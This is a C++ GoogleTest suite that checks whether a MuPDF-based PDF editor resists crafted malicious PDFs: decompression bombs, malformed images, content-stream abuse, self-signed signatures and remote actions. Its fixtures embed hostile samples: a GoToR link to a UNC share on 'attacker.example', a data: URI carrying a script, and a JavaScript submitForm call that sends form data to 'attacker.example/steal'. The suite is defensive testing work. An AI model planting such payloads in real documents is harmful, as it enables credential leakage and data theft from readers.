// -*- coding: utf-8 -*-
//
// Malicious PDF security tests — covers attack vectors identified in
// the security audit: decompression bombs, SSRF, GoToR remote paths,
// image decoder exploits, data: URIs, content stream abuse, and
// certificate validation.

#include <gtest/gtest.h>

#include "core/Document.h"
#include "core/MuPdfContext.h"
#include "core/Page.h"
#include "redaction/RedactionManager.h"
#include "signatures/LtvValidator.h"
#include "signatures/SignatureManager.h"
#include "forms/JavaScriptEngine.h"
#include "forms/FormManager.h"

#include "security_net_oracles.h"
#include "security_oracles.h"

#include <QRectF>

#include <openssl/evp.h>
#include <openssl/pkcs12.h>
#include <openssl/x509.h>

#include <chrono>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <memory>
#include <sstream>
#include <string>
#include <vector>

using namespace pdfe::core;

namespace {

std::string fixturesDir() { return std::string(TEST_FIXTURES_DIR); }

std::filesystem::path tempDir()
{
    auto d = std::filesystem::temp_directory_path() / "pdfe_malicious";
    std::filesystem::create_directories(d);
    return d;
}

void writePdf(const std::filesystem::path& path, const std::string& content)
{
    std::ofstream f(path, std::ios::binary | std::ios::trunc);
    f.write(content.data(), static_cast<std::streamsize>(content.size()));
}

} // namespace

class MaliciousPdfTest : public ::testing::Test {
protected:
    void SetUp() override {
        ctx_ = std::make_shared<MuPdfContext>();
        td_ = tempDir();
    }
    std::shared_ptr<MuPdfContext> ctx_;
    std::filesystem::path td_;
};

// =====================================================================
// 1. Decompression bomb — verify PDFE doesn't hang or OOM
// =====================================================================

TEST_F(MaliciousPdfTest, DecompressionBombHandledGracefully)
{
    // Create a PDF with a FlateDecode stream that claims a huge /Length
    // but contains minimal actual data. MuPDF should handle this without
    // hanging or consuming excessive memory.
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Contents 4 0 R >>\nendobj\n"
        "4 0 obj\n<< /Length 10 /Filter /FlateDecode >>\nstream\n"
        "xxxxxxxxxx\n"
        "endstream\nendobj\n"
        "xref\n0 5\n"
        "0000000000 65535 f \n"
        "0000000009 00000 n \n"
        "0000000058 00000 n \n"
        "0000000115 00000 n \n"
        "0000000230 00000 n \n"
        "trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "decompression_bomb.pdf";
    writePdf(path, pdf);

    auto start = std::chrono::steady_clock::now();

    try {
        auto doc = Document::open(ctx_, path);
        if (doc && doc->pageCount() > 0) {
            auto page = doc->page(0);
            if (page) {
                auto dl = doc->createDisplayList(0);
                if (dl) doc->releaseDisplayList(dl);
            }
        }
    } catch (...) {
        // Expected for malformed stream
    }

    auto elapsed = std::chrono::steady_clock::now() - start;
    double sec = std::chrono::duration<double>(elapsed).count();

    EXPECT_LT(sec, 10.0)
        << "Decompression bomb must not cause excessive processing time";
}

TEST_F(MaliciousPdfTest, NestedFlateDecode10Deep)
{
    // PDF with nested /Filter [/FlateDecode /FlateDecode ... ] 10 deep
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Contents 4 0 R >>\nendobj\n"
        "4 0 obj\n<< /Length 5 /Filter [/FlateDecode /FlateDecode "
        "/FlateDecode /FlateDecode /FlateDecode /FlateDecode "
        "/FlateDecode /FlateDecode /FlateDecode /FlateDecode] >>\n"
        "stream\nABCDE\nendstream\nendobj\n"
        "xref\n0 5\n"
        "0000000000 65535 f \n"
        "0000000009 00000 n \n"
        "0000000058 00000 n \n"
        "0000000115 00000 n \n"
        "0000000230 00000 n \n"
        "trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "nested_flate.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
    }) << "Nested FlateDecode must not crash";
}

// =====================================================================
// 2. Undo stack cleared after redaction (verify the security guard)
// =====================================================================

TEST_F(MaliciousPdfTest, RedactionClearsUndoEvidence)
{
    auto fixture = std::filesystem::path(fixturesDir()) / "test_single.pdf";
    if (!std::filesystem::exists(fixture)) GTEST_SKIP() << "fixture missing";

    auto doc = Document::open(ctx_, fixture);
    ASSERT_NE(doc, nullptr);

    // The redaction apply flow in MainWindow calls undoManager_->clear().
    // We verify at the RedactionManager level that apply succeeds and
    // the resulting PDF doesn't contain pre-redaction content.
    pdfe::redaction::RedactionManager mgr(ctx_);
    auto page = doc->page(0);
    ASSERT_NE(page, nullptr);

    mgr.createRedactionMark(page.get(), QRectF(0, 0, 612, 200));
    mgr.applyAllRedactions(doc.get());

    auto out = td_ / "redacted_undo_check.pdf";
    doc->saveAs(out);

    // Reopen and verify no undo-recoverable content
    auto reopened = Document::open(ctx_, out);
    ASSERT_NE(reopened, nullptr);
    EXPECT_GE(reopened->pageCount(), 1);

    // Raw bytes should not contain undo markers or pre-redaction streams
    std::ifstream f(out, std::ios::binary);
    std::string bytes((std::istreambuf_iterator<char>(f)),
                       std::istreambuf_iterator<char>());
    EXPECT_EQ(bytes.find("/UndoStack"), std::string::npos)
        << "Saved PDF must not contain undo stack data";
}

// =====================================================================
// 3. GoToR remote path — verify link dispatch rejects remote refs
// =====================================================================

TEST_F(MaliciousPdfTest, GoToRRemotePathRejected)
{
    // Create PDF with a GoToR action pointing to a remote UNC path
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Annots [4 0 R] >>\nendobj\n"
        "4 0 obj\n<< /Type /Annot /Subtype /Link "
        "/Rect [100 700 300 720] "
        "/A << /S /GoToR /F (\\\\\\\\attacker.example\\\\share\\\\evil.pdf) "
        "/D [0 /Fit] >> >>\nendobj\n"
        "xref\n0 5\n"
        "0000000000 65535 f \n"
        "0000000009 00000 n \n"
        "0000000058 00000 n \n"
        "0000000115 00000 n \n"
        "0000000230 00000 n \n"
        "trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "gotor_remote.pdf";
    writePdf(path, pdf);

    // A3-01. This test's own comment promised that opening the page "must not
    // trigger any network access to the remote path" — and then asserted only
    // EXPECT_NO_THROW. The meta-audit recorded exactly that: the process-spawn
    // and JS-sandbox axes of R-01 were closed with positive neutralisation
    // oracles, but the SOCKET / UNC axis had none anywhere in the suite
    // (`grep -c "socket\|UNC" tests/security_oracles.h` -> 0).
    //
    // Both observers are armed below. The connection observer is the one built
    // for F13/SEC-46 and it carries its own positive control
    // (NetworkEgressGuardOracle.ObserverDetectsALoopbackConnection), so a zero
    // here is a measured zero, not a blind one. The spawn observer covers the
    // "handed the UNC path to something else to fetch" variant.
    pdfe_test::NetworkEgressGuard netGuard;
    pdfe_test::ProcessSpawnGuard spawnGuard;

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc && doc->pageCount() > 0) {
            auto page = doc->page(0);
            // Render too: a lazily-resolved remote reference would be touched
            // here rather than at open.
            (void)page->render(QRectF(), 0.5f);
        }
    }) << "GoToR with remote path must not crash on open";

    netGuard.stop();

    if (netGuard.supported()) {
        EXPECT_EQ(netGuard.externalConnectionCount(), 0u)
            << "opening/rendering a page whose only Link action is a GoToR to "
               "\\attacker.example\share must not produce ANY outbound "
               "connection: " << netGuard.report();
    } else {
        // Recorded, not silently treated as clean (the guard's own contract).
        RecordProperty("net_observer", "unsupported");
    }
    EXPECT_EQ(spawnGuard.newlySpawned(), "")
        << "the remote GoToR target must not be handed to a helper process to "
           "fetch";
}

// =====================================================================
// 4. data: URI scheme — verify not auto-executed
// =====================================================================

TEST_F(MaliciousPdfTest, DataUriNotExecuted)
{
    // PDF with a URI action containing a data: URL
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Annots [4 0 R] >>\nendobj\n"
        "4 0 obj\n<< /Type /Annot /Subtype /Link "
        "/Rect [100 700 300 720] "
        "/A << /S /URI /URI (data:text/html,<script>alert(1)</script>) "
        ">> >>\nendobj\n"
        "xref\n0 5\n"
        "0000000000 65535 f \n"
        "0000000009 00000 n \n"
        "0000000058 00000 n \n"
        "0000000115 00000 n \n"
        "0000000230 00000 n \n"
        "trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "data_uri.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        ASSERT_NE(doc, nullptr);
        auto page = doc->page(0);
        ASSERT_NE(page, nullptr);
        // Rendering the page must not execute the data: URI
        auto dl = doc->createDisplayList(0);
        if (dl) doc->releaseDisplayList(dl);
    }) << "data: URI in link must not crash or auto-execute";
}

// =====================================================================
// 5. Image decoder — malformed JPEG header
// =====================================================================

TEST_F(MaliciousPdfTest, MalformedJpegStreamDoesNotCrash)
{
    // PDF with an inline image using a truncated JPEG header
    std::string jpeg_header = "\xFF\xD8\xFF\xE0\x00\x10JFIF";
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Contents 4 0 R /Resources << /XObject << /Im0 5 0 R >> >> "
        ">>\nendobj\n"
        "4 0 obj\n<< /Length 29 >>\nstream\nq 100 0 0 100 50 650 cm "
        "/Im0 Do Q\nendstream\nendobj\n"
        "5 0 obj\n<< /Type /XObject /Subtype /Image /Width 1 /Height 1 "
        "/ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode "
        "/Length " + std::to_string(jpeg_header.size()) + " >>\nstream\n"
        + jpeg_header + "\nendstream\nendobj\n"
        "xref\n0 6\n"
        "0000000000 65535 f \n"
        "0000000009 00000 n \n"
        "0000000058 00000 n \n"
        "0000000115 00000 n \n"
        "0000000300 00000 n \n"
        "0000000400 00000 n \n"
        "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "malformed_jpeg.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc && doc->pageCount() > 0) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Malformed JPEG in XObject must not crash";
}

TEST_F(MaliciousPdfTest, ZeroDimensionImageDoesNotCrash)
{
    // PDF with an image XObject declaring 0x0 dimensions
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Contents 4 0 R /Resources << /XObject << /Im0 5 0 R >> >> "
        ">>\nendobj\n"
        "4 0 obj\n<< /Length 29 >>\nstream\nq 100 0 0 100 50 650 cm "
        "/Im0 Do Q\nendstream\nendobj\n"
        "5 0 obj\n<< /Type /XObject /Subtype /Image /Width 0 /Height 0 "
        "/ColorSpace /DeviceRGB /BitsPerComponent 8 /Length 0 >>\n"
        "stream\nendstream\nendobj\n"
        "xref\n0 6\n"
        "0000000000 65535 f \n"
        "0000000009 00000 n \n"
        "0000000058 00000 n \n"
        "0000000115 00000 n \n"
        "0000000300 00000 n \n"
        "0000000400 00000 n \n"
        "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "zero_dim_image.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc && doc->pageCount() > 0) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Zero-dimension image must not crash";
}

// =====================================================================
// 6. Content stream operator abuse
// =====================================================================

TEST_F(MaliciousPdfTest, OversizedTjArrayDoesNotCrash)
{
    // Build a content stream with a Tj array containing many elements
    std::string tj_array = "[";
    for (int i = 0; i < 10000; ++i) {
        tj_array += "(A) 1 ";
    }
    tj_array += "] TJ";

    std::string stream = "BT /F1 12 Tf 100 700 Td " + tj_array + " ET";

    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Resources << /Font << /F1 << /Type /Font /Subtype /Type1 "
        "/BaseFont /Helvetica >> >> >> "
        "/Contents 4 0 R >>\nendobj\n"
        "4 0 obj\n<< /Length " + std::to_string(stream.size()) +
        " >>\nstream\n" + stream + "\nendstream\nendobj\n"
        "xref\n0 5\n"
        "0000000000 65535 f \n"
        "0000000009 00000 n \n"
        "0000000058 00000 n \n"
        "0000000115 00000 n \n"
        "0000000300 00000 n \n"
        "trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "oversized_tj.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc && doc->pageCount() > 0) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Oversized TJ array (10K elements) must not crash";
}

TEST_F(MaliciousPdfTest, ExtremeMatrixValuesDoNotCrash)
{
    // Content stream with extreme CTM values
    std::string stream = "q 1e30 0 0 1e30 0 0 cm BT /F1 12 Tf 0 0 Td (X) Tj ET Q";

    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Resources << /Font << /F1 << /Type /Font /Subtype /Type1 "
        "/BaseFont /Helvetica >> >> >> "
        "/Contents 4 0 R >>\nendobj\n"
        "4 0 obj\n<< /Length " + std::to_string(stream.size()) +
        " >>\nstream\n" + stream + "\nendstream\nendobj\n"
        "xref\n0 5\n"
        "0000000000 65535 f \n"
        "0000000009 00000 n \n"
        "0000000058 00000 n \n"
        "0000000115 00000 n \n"
        "0000000300 00000 n \n"
        "trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "extreme_matrix.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc && doc->pageCount() > 0) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Extreme CTM matrix values must not crash";
}

// =====================================================================
// 7. Self-signed certificate detection
// =====================================================================

TEST_F(MaliciousPdfTest, SelfSignedCertReportedAsUntrusted)
{
    auto pfx = std::filesystem::path(fixturesDir()) / "test_signer.pfx";
    auto src = std::filesystem::path(fixturesDir()) / "test_single.pdf";
    if (!std::filesystem::exists(pfx) || !std::filesystem::exists(src))
        GTEST_SKIP() << "Signing fixtures not available";

    pdfe::signatures::SignatureManager mgr(ctx_);

    auto step1 = td_ / "selfcert_step1.pdf";
    {
        auto doc = Document::open(ctx_, src);
        auto page = doc->page(0);
        mgr.createSignatureField(page.get(), "SelfSig", QRectF(100, 500, 200, 50));
        doc->saveAs(step1);
    }

    auto step2 = td_ / "selfcert_step2.pdf";
    std::filesystem::copy(step1, step2, std::filesystem::copy_options::overwrite_existing);
    {
        auto doc = Document::open(ctx_, step2);
        auto page = doc->page(0);
        pdfe::signatures::SigningOptions opts;
        opts.pfxPath = pfx.string();
        opts.pfxPassword = "test123";
        opts.reason = "Self-signed cert test";
        mgr.signField(doc.get(), page.get(), 0, opts);
    }

    // Verify: self-signed cert should NOT be LtvValidated
    auto doc = Document::open(ctx_, step2);
    ASSERT_NE(doc, nullptr);

    auto result = pdfe::signatures::LtvValidator::verify(doc.get());
    EXPECT_NE(result.status, pdfe::signatures::LtvStatus::LtvValidated)
        << "Self-signed certificate must not produce LtvValidated";

    // The test_signer.pfx is self-signed, so the chain should be untrusted
    // unless explicitly added to TrustAnchorManager
    EXPECT_TRUE(
        result.status == pdfe::signatures::LtvStatus::UntrustedChain ||
        result.status == pdfe::signatures::LtvStatus::NoDssData ||
        result.status == pdfe::signatures::LtvStatus::OnlineValidated)
        << "Self-signed cert should report as untrusted or no DSS data, got: "
        << static_cast<int>(result.status);
}

// =====================================================================
// 8. JS submitForm / exportDataObject not exposed
// =====================================================================

TEST_F(MaliciousPdfTest, JsSubmitFormNotAvailable)
{
    auto formPdf = std::filesystem::path(fixturesDir()) / "test_form.pdf";
    if (!std::filesystem::exists(formPdf)) GTEST_SKIP() << "fixture missing";

    auto doc = Document::open(ctx_, formPdf);
    ASSERT_NE(doc, nullptr);

    pdfe::forms::JavaScriptEngine engine(ctx_);
    auto page = doc->page(0);
    ASSERT_NE(page, nullptr);
    engine.enable(page.get());

    // Attempt to call submitForm via keystroke event value injection
    EXPECT_NO_THROW({
        engine.fireKeystrokeEvent(page.get(), 0,
            "this.submitForm('http://attacker.example/steal')",
            "", 0, 0, false);
    }) << "this.submitForm must not crash (should be undefined in MuJS)";

    EXPECT_NO_THROW({
        engine.fireKeystrokeEvent(page.get(), 0,
            "this.exportDataObject({cName:'data', nLaunch:2})",
            "", 0, 0, false);
    }) << "this.exportDataObject must not crash";
}
